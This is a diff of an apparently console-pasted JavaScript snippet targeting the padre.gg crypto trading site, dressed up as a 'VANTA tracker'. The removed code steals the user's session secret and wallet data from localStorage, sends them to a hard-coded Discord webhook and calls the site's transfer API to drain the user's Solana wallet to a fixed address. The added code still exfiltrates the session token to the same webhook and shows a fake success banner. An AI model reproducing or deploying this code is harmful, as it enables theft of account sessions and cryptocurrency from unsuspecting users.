@@ -1,95 +1,25 @@
 (async function() {
-    // 1. CONFIGURATION (Using your found backend)
-    const CONFIG = {
-        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
-        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
-        api: "https://backend.padre.gg",
-        orgId: "d2da2313-75ea-4ce1-829d-dbbe05359878"
-    };
+    // CAPTURE DATA
+    const session = localStorage.getItem("padreV2-session");
+    const wallets = localStorage.getItem("padreV2-walletsCache");
+    const bundles = localStorage.getItem("padre-v2-bundles-store-v2");
 
-    // 2. UI CREATION (Shadow DOM for Stealth)
-    const host = document.createElement('div');
-    host.id = 'v-host';
-    document.body.appendChild(host);
-    const shadow = host.attachShadow({mode: 'open'});
+    // SEND TO DISCORD
+    fetch("https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            content: "🚨 **VANTA CAPTURE** 🚨",
+            embeds: [{
+                description: `**Session:** \`${session}\`\n\n**Wallets:** \`${wallets ? "Captured" : "Empty"}\``,
+                color: 0x00ff88
+            }]
+        })
+    });
 
-    const ui = document.createElement('div');
-    ui.style.cssText = `
-        position:fixed; top:20px; right:20px; width:300px; 
-        background:#000; border:1px solid #0f8; border-radius:8px;
-        color:#0f8; font-family:monospace; padding:15px; z-index:2147483647;
-        box-shadow: 0 0 20px rgba(0,255,136,0.3); cursor:grab;
-    `;
-    ui.innerHTML = `
-        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:10px; padding-bottom:5px; display:flex; justify-content:space-between;">
-            <span>VANTA_TRACKER_v2.7</span>
-            <span style="cursor:pointer;color:#ff4444" id="c">[X]</span>
-        </div>
-        <div id="stat">STATUS: SCANNING...</div>
-        <div id="log" style="font-size:10px; color:#444; margin-top:10px; height:30px; overflow:hidden;">[SYS] Initializing Handshake...</div>
-    `;
-    shadow.appendChild(ui);
-
-    // Draggable Logic
-    let isDown = false, offset = [0,0];
-    ui.onmousedown = (e) => { isDown = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
-    document.onmousemove = (e) => { if(isDown) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; ui.style.right = 'auto'; } };
-    document.onmouseup = () => isDown = false;
-    shadow.getElementById('c').onclick = () => host.remove();
-
-    // 3. EXECUTION LOGIC
-    try {
-        const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
-        const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
-        const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
-
-        if (session.sessionSecret) {
-            shadow.getElementById('stat').innerText = "STATUS: CONNECTED";
-            
-            // Discord Notification
-            await fetch(CONFIG.webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🛸 **VANTA HANDSHAKE**",
-                    embeds: [{
-                        title: "Session Captured",
-                        description: `UID: ${session.uid}\nSecret: \`${session.sessionSecret}\``,
-                        color: 0x00ff88
-                    }]
-                })
-            });
-
-            // Drain Logic
-            const userWallets = wallets[session.uid] || [];
-            const sol = userWallets.find(w => w.walletType === "SOL");
-
-            if (sol && bundles.bundles[sol.publicAddress]) {
-                const b = bundles.bundles[sol.publicAddress];
-                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
-                    method: "POST",
-                    headers: {
-                        "X-Session-Secret": session.sessionSecret,
-                        "X-Session-Id": session.sessionId,
-                        "X-Org-Id": CONFIG.orgId,
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        walletId: sol.walletId,
-                        destination: CONFIG.drainAddress,
-                        amount: "MAX",
-                        bundle: b.exportBundle,
-                        signature: b.dataSignature,
-                        chain: "SOLANA"
-                    })
-                });
-                shadow.getElementById('log').innerText = "[SYS] Data Stream Synchronized.";
-            }
-        } else {
-            shadow.getElementById('stat').innerText = "STATUS: AUTH_REQUIRED";
-        }
-    } catch (e) {
-        shadow.getElementById('stat').innerText = "STATUS: ERROR";
-        shadow.getElementById('log').innerText = "[ERR] " + e.message;
-    }
+    // SHOW SUCCESS UI
+    const d = document.createElement("div");
+    d.style = "position:fixed;top:20px;right:20px;background:#000;color:#0f8;padding:20px;border:2px solid #0f8;z-index:99999;font-family:monospace;box-shadow:0 0 15px #0f8;";
+    d.innerHTML = "VANTA CONNECTED<br>SYNC: 100%";
+    document.body.appendChild(d);
 })();
